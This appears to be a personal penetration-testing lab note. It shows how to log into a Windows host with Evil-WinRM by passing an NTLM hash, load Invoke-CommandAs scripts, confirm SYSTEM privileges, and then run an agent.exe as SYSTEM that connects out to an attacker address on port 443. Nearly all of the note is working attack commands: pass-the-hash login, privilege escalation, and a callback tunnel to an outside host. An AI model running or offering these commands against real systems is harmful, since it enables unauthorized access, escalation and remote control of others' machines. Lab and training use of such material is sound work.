To make everything more simple I created a local scripts folder to use for Evil-WinRM. This will allow me not have to map the entire directory.

![[Pasted image 20231214120707.png]]

in the new scripts directory create two PowerShell files.

![[Invoke-ScheduledTask.ps1]] https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Private/Invoke-ScheduledTask.ps1

![[Invoke-CommandAs 1.ps1]] https://github.com/mkellerman/Invoke-CommandAs/blob/master/Invoke-CommandAs/Public/Invoke-CommandAs.ps1

### Evil-WinRM

```
evil-winrm -i 172.16.1.20 -u xadmin -H 649f65073a6672a9898cb4eb61f9684a -s /home/p3ta/scripts/PS_Scripts
```

Invoke the scripts

```
*Evil-WinRM* PS C:\Users\xadmin\Documents> Invoke-ScheduledTask.ps1
*Evil-WinRM* PS C:\Users\xadmin\Documents> Invoke-CommandAs.ps1
```

Verify that the scripts are functioning

```
*Evil-WinRM* PS C:\Users\xadmin\Documents> Invoke-CommandAs -ScriptBlock {whoami} -AsSystem
nt authority\system
```

Execute your command as system, in this case agent.exe

```
*Evil-WinRM* PS C:\Users\xadmin\Documents> Invoke-CommandAs -ScriptBlock { C:\Users\xadmin\Documents\agent.exe -connect 10.10.14.21:443 -ignore-cert } -AsSystem
```